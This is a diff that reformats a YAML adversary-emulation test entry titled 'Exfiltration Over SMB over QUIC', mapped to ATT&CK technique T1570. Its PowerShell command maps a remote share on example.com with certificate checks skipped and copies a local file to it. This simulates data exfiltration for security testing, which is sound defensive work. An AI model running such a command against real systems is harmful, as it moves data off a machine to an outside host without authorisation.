@@ -1,13 +1,15 @@
-- id: 36e5c5ba-0d6f-58df-94c3-d2ad014a9de6
+- requirements: []
   name: Soumaia ART Tests - Exfiltration Over SMB over QUIC (New-SmbMapping)
   description: "Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center (requires elevation)"
   tactic: lateral-movement
-  technique:
-    attack_id: T1570
-    name: Lateral Tool Transfer
-  platforms:
-    windows:
-      psh:
-        command: |-
-          New-SmbMapping -RemotePath '\\example.com\sales' -TransportType QUIC -SkipCertificateCheck
-          copy 'C:\path\to\file.txt' 'Z:\'
+  technique_id: T1570
+  technique_name: Lateral Tool Transfer
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: New-SmbMapping -RemotePath '\\example.com\sales' -TransportType QUIC -SkipCertificateCheck; copy 'C:\path\to\file.txt' 'Z:\'
+  id: 36e5c5ba-0d6f-58df-94c3-d2ad014a9de6
